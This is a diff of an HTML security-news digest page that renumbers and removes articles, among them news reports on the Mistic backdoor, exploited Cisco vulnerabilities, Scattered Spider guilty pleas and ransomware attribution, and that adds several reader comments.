-To learn more about Microsoft Security solutions, visit our [website.](https://www.microsoft.com/en-us/security/business) Bookmark the [Microsoft Security blog](https://www.microsoft.com/security/blog/) to keep up with our expert coverage on security matters. Also, follow us on LinkedIn ([Microsoft Security](https://www.linkedin.com/showcase/microsoft-security/)) and X ([@MSFTSecurity](https://twitter.com/@MSFTSecurity)) for the latest news and updates on cybersecurity.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-3" class="article-body">
+        <div id="art-6" class="article-body">
             <h2 class="article-title">Disposable Tooling: Building LLM-Generated Mythic Agents from Prompt to Deployment</h2>
             <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/06/24/disposable-tooling-building-llm-generated-mythic-agents-from-prompt-to-deployment/" target="_blank">Original Link</a></p>
             <div class="content-text"><p>An area I’ve been very interested in exploring over the past several months is the generation of what I have been calling “disposable tooling”. With the development space now discussing the reduced cost of writing code, the idea is to also explore how offensive tooling can be brought closer to the paradigm that appeared when [&#8230;]</p>
@@ -203,7 +689,7 @@ To learn more about Microsoft Security solutions, visit our [website.](https://w
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-4" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</h2>
             <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager/" target="_blank">Original Link</a></p>
             <div class="content-text">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager
@@ -412,65 +898,7 @@ Mandiant would like to thank the Cisco Product Security Incident Response Team (
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-5" class="article-body">
-            <h2 class="article-title">Stealthy Mistic backdoor linked to ransomware access broker KongTuke</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/stealthy-mistic-backdoor-linked-to-ransomware-access-broker-kongtuke/" target="_blank">Original Link</a></p>
-            <div class="content-text">A new backdoor dubbed Mistic has been observed in financially motivated attacks targeting organizations in the insurance, education, IT, and professional services sectors.
-The malware is believed to be linked to KongTuke/Woodgnat, an initial access broker active since at least 2024 that specializes in compromising corporate networks and selling that access to ransomware groups, including Qilin, Interlock, Rhysida, Akira, 8Base, and Black Basta.
-Researchers at cybersecurity company Symantec say that Mistic has been used in intrusions since April.
-In at least one incident, it was deployed shortly after ModeloRAT, a [backdoor attributed to KongTuke](https://www.bleepingcomputer.com/news/security/kongtuke-hackers-now-use-microsoft-teams-for-corporate-breaches/) and delivered via social engineering attacks over Microsoft Teams.
-Symantec believes that Mistic is a newly developed, stealthy backdoor designed for long-term persistence in compromised networks.
-Mistic attack chain
-In the attacks investigated by Symantec, the infection started with the launch of the legitimate executable MpExtMs.exe to side-load a malicious DLL named version.dll, which acts as the loader of Mistic (EndpointDlp.dll).
-The researchers note that the filename chosen for Mistic resembles Microsoft endpoint security tooling, which may help the malware blend in with trusted software on the host.
-A separate .NET DLL is also loaded, which displays a fake login screen to the victim to steal their account credentials.
-Once loaded, Mistic communicates with its command-and-control infrastructure and can receive commands from the operator. Symantec lists the following capabilities:
-- Upload/download, move, rename, delete files, and create folders
-- Modify how frequently Mistic checks for commands from the command-and-control (C2) server
-- Execute code received from the C2 directly in memory
-- Terminate itself and delete files from the host
-According to Symantec’s analysis, Mistic appears to have been designed for stealth, enabling attackers to maintain a persistent foothold within compromised networks over extended periods.
-“The backdoor runs payloads in memory with no file written to disk and includes a kill switch that lets it delete itself, which are features consistent with an operator seeking long-term, low-visibility access,” the [researchers say](https://www.security.com/threat-intelligence/new-mistic-backdoor-modeloRAT).
-Symantec does not provide details on how the infection begins, but KongTuke has been known to use ClickFix, and its [FileFix](https://www.bleepingcomputer.com/news/security/interlock-ransomware-adopts-filefix-method-to-deliver-malware/) and [CrashFix](https://www.bleepingcomputer.com/news/security/fake-ad-blocker-extension-crashes-the-browser-for-clickfix-attacks/) variants, since early 2025 to deliver the ModeloRAT malware.
-In a [technical report](http://www.zscaler.com/blogs/security-research/technical-analysis-mltbackdoor) this week, cloud security company Zscaler notes that Mistic, which it tracks as MTLBackdoor, was delivered as a payload in a multi-stage ClickFix infection chain in May.
-Zscaler researchers say that "one of the most powerful features [in MTLBackdoor] is the ability to load Beacon Object Files (BOFs) to expand its capabilities."
-BOFs are small programs in C that can execute directly in the memory of a command-and-control (C2) process, leaving no footprint on the disk and evading detection of security agents. They are common in red team products, such as Cobalt Strike, for the post-exploitation stage.
-Symantec believes that Mistic confirms the observed trend of custom tools being used in ransomware attacks, although the backdoor appears to have been developed by an initial access broker closely connected to the ransomware scene.
-KongTuke is known to use multiple other tools, such as the legitimate WinPython and Node.js runtimes to execute malicious code, finger.exe to retrieve obfuscated payloads, the [fake NexShield browser extension](https://www.bleepingcomputer.com/news/security/fake-ad-blocker-extension-crashes-the-browser-for-clickfix-attacks/), the encrypted GateKeeper .NET payload, and the MintsLoader and D3F@ck Loader malware loaders to deliver additional payloads.
-Both Zscaler and Symantec reports [[1](https://www.zscaler.com/blogs/security-research/technical-analysis-mltbackdoor), 2] provide indicators of compromise for the Mistic/MTLBackdoor malware and note that it is a stealthy tool that can expand its functionality.
-[Test every layer before attackers do](https://hubs.li/Q04jQ9z40)
-Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen.
-The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection.
-[Get the whitepaper](https://hubs.li/Q04jQ9z40)
-Post a Comment Community Rules
-You need to login in order to post a comment
-Not a member yet? Register Now</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-6" class="article-body">
-            <h2 class="article-title">Cisco Unified CM Flaw Exploited After PoC Reveals File-Write Path to Root</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/cisco-unified-cm-flaw-exploited-after.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Threat actors have begun to exploit a recently disclosed critical security flaw impacting Cisco Unified Communications Manager (Unified CM) and Unified Communications Manager Session Management Edition (Unified CM SME).
-The vulnerability, tracked as [CVE-2026-20230](https://thehackernews.com/2026/06/cisco-patches-cve-2026-20230-in-unified.html) (CVSS score: 8.6), is a case of improper input validation for specific HTTP requests that could allow an unauthenticated, remote attacker to conduct server-side request forgery (SSRF) attacks through an affected device.
-"An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device," Cisco said in an advisory released earlier this month. "A successful exploit could allow the attacker to write files to the underlying operating system that could be used later to elevate to root."
-In a post shared on X earlier this week, Defused Cyber [said](https://x.com/DefusedCyber/status/2069074520057557244) it observed active exploitation of the vulnerability in attacks. "This is currently being exploited from a single source using an unvetted PoC, with genuinely-formatted file:// file-write payloads landing on our decoys," it noted.
-However, for successful exploitation to occur, the WebDialer service must be enabled. It's disabled by default. To check if the WebDialer is enabled, users can [complete](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssrf-cXPnHcW) the following steps -
-- Log in to the Cisco Unified CM Administration interface
-- From the Navigation menu, choose Cisco Unified Serviceability and click Go
-- From the Tools menu, choose Control Center - Feature Services
-- In the CTI Services section of the page, check whether the current status of the Cisco WebDialer Web Service is Started or Not Running
-- If the status is Started, WebDialer is enabled
-The vulnerability has been patched in Unified CM and Unified CM SME versions 14SU6 and 15SU5. If immediate patching is not an option, it's advised to disable the WebDialer service until a fix can be applied.
-SSD Secure Disclosure has since [published](https://ssd-disclosure.com/cisco-unified-communications-manager-arbitrary-file-write-to-rce/) additional technical specifics of CVE-2026-20230, describing it as a flaw that allows unauthenticated attackers to arbitrarily write files in the server by leveraging the Webdialer component to obtain the true hostname of the target and ultimately achieve code execution.
-Cisco has yet to update the advisory to reflect the exploitation status. Last week, the network security company released security updates for a medium-severity security flaw in Catalyst SD-WAN Manager ([CVE-2026-20262](https://thehackernews.com/2026/06/cisco-releases-security-updates-for.html), CVSS score: 6.5) that has come under active exploitation in the wild.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-7" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">Scattered Spider Hackers Plead Guilty on Day 1 of Trial</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/scattered-spider-hackers-plead-guilty-on-day-1-of-trial/" target="_blank">Original Link</a></p>
             <div class="content-text">Two men pleaded guilty in the United Kingdom this week to criminal charges stemming from an August 2024 cyberattack that crippled Transport for London, the entity responsible for the public transport network in the Greater London area. The duo were key members of a prolific cybercrime group known as Scattered Spider, and their guilty pleas came on the first day of what was expected to be a six-week trial.
@@ -490,6 +918,7 @@ A friend of my nephew is a 23 year old guy with obvious talent who seems to be u
 I think he wants me to retire and has the idea that he can take my job. However, he has neither the knowledge nor the temperament to do the job. He’s too much of a hothead and thinks that he knows absolutely everything about everything, especially computers and electronics.
 For example, when he first came to town, he was helping my nephew run a cable in someone’s house. They ran three cables and couldn’t get any of the runs to work. He claimed the cable was rotten, that the connectors were bad, and that the cable tool was broken. There was nothing wrong with any of that — the issue is with his own arrogant belief that nothing is ever his fault.
 He is not my employee — he has too many red flags for me to consider him for a job.
+Nah, no ‘ccomplices.
 What must their parents think?
 Should we expect more arrests soon?
 While it is difficult to trace many spammers and scammers through the cyberlabyrinth of the WWW, it is heartening to see that over time, more of these lost souls are being caught.
@@ -504,12 +933,18 @@ I don’t think the courts and laws have caught up with what should be more seve
 They are more connected than people think. Just like the jellyfish-like drone swarms. I wouldn’t be so quick to assume they aren’t mutually aware, like some effed up MUFON.
 Hacking sure wasn’t like that fifteen years ago.
 And wouldn’t you know it they wanted fictional time machines then also.
-“Throwing their lives away” to be future security consultants when they do their face turn.</div>
+“Throwing their lives away” to be future security consultants when they do their face turn.
+Nah, the world doesn’t work like that usually anymore, and there are plenty of folks straddling that line that didn’t get caught left to hire. Assuming there is even an equivalent skill set in demand five, eight, ten, whatever years from now. Not saying they can’t have a life after sentencing, just that the time of the convicted felon wunderkind with a future in a field demanding trust, as a given, is long gone.
+Check, garçon!
+The TFL hack started on 31st August, and Flowers was arrested for it on 6th September. So clearly no opsec skills. They had to plead guilty as the evidence included videos and screenshots that these idiots had saved to their own personal devices.
+I always wonder what role the parents play in having teenagers who engage in this criminal activity. These kids reap huge financial rewards – don’t the parents see that? Are they really that clueless? Perhaps they should share some of the responsibility for all the harm their child causes others.
+Juvenile computer crime and hacking recidivism rates aren’t generally tracked so I also wonder how many commit post-incarceration crimes.
+WELCOME TO BACOB JUTLER CAFE!</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-8" class="article-body">
+        <div id="art-9" class="article-body">
             <h2 class="article-title">Who Runs the Ransomware Group ‘The Gentlemen?’</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/who-runs-the-ransomware-group-the-gentlemen/" target="_blank">Original Link</a></p>
             <div class="content-text">A cybercrime group known as The Gentlemen has emerged as the second most active ransomware gang by victim count, rapidly attracting a talented pool of hackers through an aggressive recruitment strategy that promises affiliates 90 percent of any ransom paid by victims. This post examines clues pointing to a real life identity for the administrator of The Gentlemen ransomware group.
@@ -601,65 +1036,6 @@ Krebs isn’t run by any one group of anything any more than you are.
 Lots of AI slop puppeting every meatpuppet now (no offense, Brian).
 Great breakdown on threat actor attribution. Security research like this is essential for organizations evaluating third-party risk. I run a site covering crypto and financial analysis and send your investigative work to clients regularly as a reference.
 Very interesting article, I always say there’s only one internet and there’s residue from everyone on it. And now with AI able to aggregate so much it truly shows that the internet is us and we are the internet. We’ve been building our digital persona for years, our essence is in the very fabric.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-9" class="article-body">
-            <h2 class="article-title">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team</h2>
-            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/how-to-train-your-dragons-analysts" target="_blank">Original Link</a></p>
-            <div class="content-text">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team
-Whether it be the advent of AI technologies, new Red-Team techniques and exploits, or new patches and emergent defensive technologies, it’s pretty clear to all of us operating within technology fields that the landscape of computing and cyber-security is ever evolving.
-In order to stay up to date with all that’s going on, the TrustedSec Purple Team has been hard at work renovating and improving our assessments to better service the needs of our clients and the broader security community.
-This blog post will walk you through the types of Purple Team assessments that we offer, how to choose the assessment that will meet your security team where they are, and offer the best path forward to improvement.
-TrustedSec Engagement Overview
-Live Fire Exercise (LFX)
-The Live Fire Exercise is an active testing engagement in which TrustedSec consultants execute a pre-designed playbook of attack scenarios within your environment, and then, in tandem with the client’s Blue Team, leverage the generated telemetry to test, validate, and evaluate logging within the clients defensive tooling (EDR, SIEM, IDPS).
-The LFX comes in two models: live bootcamp style assessments, and ad-hoc assessments which allow TrustedSec consultants to perform the same work, but with more scheduling flexibility.
-Detection Validation and Review Assessment (DVR)
-The Detection Validation and Review Assessment is another active testing style assessment that targets a specific and defined list of client-built detections.
-In this ad-hoc style engagement, TrustedSec will test and validate that existing detections can fire and will provide tangible recommendations to improve logic or recommend additional detections if a gap in coverage is identified.
-Defense Validation and SIEM Ingestion Review (DVSIR)
-TrustedSec's Defense Validation is a structured assessment designed to quantify the effectiveness of an organization's defensive controls. The engagement begins with a Detection and Alerting Interview, where consultants collaborate with the organization to identify its primary security goals, high-priority systems, and business-critical data. A SIEM Configuration Review is then performed to assess whether the organization’s SIEM has sufficient visibility into environmental logging, aiming to reduce unnecessary event logging to maximize the usability of the SIEM.
-Adversarial Detection and Countermeasures Engagement (AD&C) and General Variants
-The AD&C assessment features live attack scenario execution and custom, high-fidelity detections written directly within your SIEM or EDR platform. We also evaluate the security posture surrounding those scenarios and provide tangible guidance for how to improve.
-This exercise comes in two models: live bootcamp style assessments, or an ad-hoc assessment.
-To tailor your experience, we also offer multiple AD&C Assessment variants, such as:
-- Phases: Our standard playbooks. A great place to start if you’re new to working with us.
-- MITRE Focused: Know your environment? If there are specific gaps pertaining to a specific phase of the MITRE framework (e.g. Lateral Movement, Discovery), this is a great assessment for having a more targeted evaluation of the problem area.
-- Cloud: Looking for detection engineering for AWS, GCP, Azure- or other cloud platforms? This is the right assessment for you!
-- Blue Team Guidance: Looking to review and cover gaps from an existing pentest or Red Team? This assessment focuses on walking through key techniques and issues from the report, leveraging the work that has already been done to close existing gaps in detection or prevention.
-- ADS: Want an AD&C but don’t have the time or budget for a large-scale assessment? This variant is limited in scope but is an excellent choice for clients who may wish to test out and see if this type of assessment will meet their needs, or for those who need an accelerated timeline.
-- Ransomware Resilience: A shorter, ransomware focused assessment that seeks to identify and cover detection gaps for common ransomware techniques.
-Threat Emulation Assessment (TEA)
-A threat emulation is a more advanced assessment wherein TrustedSec will design a custom threat emulation based on a specific Threat Group, execute the scenario, and ensure that proper detection capabilities exist for each step in the attack sequence.
-Deception Engineering and Implementation Engagement (DEIE)
-The DEIE engagement is another advanced assessment for clients looking to design and implement deception technologies and accompanying detections within their environments.
-In this assessment, clients can choose from pre-built deception technologies per technology stack, or work with TrustedSec consultants to design custom deceptions for a platform of their choosing.
-SOC Response Training
-The SOC-RT assessment is a hybrid, interactive tabletop training exercise that provides practical hands-on exercises for your defensive team. In this assessment, a series of attack sequences will be executed in your environment and guided exercises will walk your SOC through investigative logic and solutions, with an attack scenario live demonstration and subsequent investigative discussion after each exercise.
-How to Pick your Perfect Match
-Now that you have a solid idea on each of our offerings, let’s talk about how to choose the Purple Team assessment that will get you and your security team the best value.
-Where to Start
-For clients who may not know where to start their journey, or would like help better understanding their environment, logging, and existing detection capabilities, we highly recommend starting with a Defense Validation and SIEM Ingestion Review (DVSIR) or a Live Fire Exercise (LFX).
-A DVSIR will help you identify critical assets and existing technologies through inquiry style testing and then evaluate your current SIEM to provide recommendations on existing logging structure and how to get the most out of your SIEM.
-A Live Fire Exercise will then test logging directly with real world attack scenarios to ensure that you have the needed telemetry in place to be able to detect them.
-Where to Go Next
-For those clients who have a strong idea of their defensive tooling and logging infrastructure, we highly recommend one (or more!) of the next three assessment types.
-If you’re looking for a detection building engagement, look no further than our AD&C assessments. This will provide attack demonstrations, knowledge transfer from consultant to security teams, and will feature custom detection engineering that will be implementation ready by the end of the assessment.
-Alternately, if you’re looking to improve existing detections, try our Detection Validation and Review Assessment. In this assessment, we will test your existing detections, recommend improvements in logic, and identify any gaps that may be present.
-Or, if you’re looking to help augment and test your Defensive teams’ skills, try a SOC Response Training exercise.
-For the Advanced Security Teams Among Us
-If you’re looking for something new to enhance your security program, why not try a Threat Emulation Assessment, or our Deception Engineering assessment? Both of these assessments look to improve your defenses in ways that go beyond basic or intermediate level testing.
-Your Adventure at a Glance:
-It’s also possible to view our assessments through the following lenses:
-- Detection Engineering Assessments
-- Active Testing Assessment, and;
-- Level-Up Assessments
-The graphic below gives a quick overview of the assessment, and which categories they fall into.
-In addition to all the engagement styles we offer above, we are always more than happy to sit down and chat about the security posture of your organization. If something above doesn’t match what you’re looking for, let us know! We also offer customized approaches that may better suit your team’s needs.
-Conclusion
-Picking the right Purple Team assessment for your organization can be a challenging endeavor, whether it be identifying a starting point, or putting together a roadmap for next-steps. TrustedSec’s account managers and consulting team have the skills and expertise to provide actionable guidance to assist your organization at all stages of its journey. If you have questions or are interested in these services, please [get in touch with us](https://trustedsec.com/contact)!</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
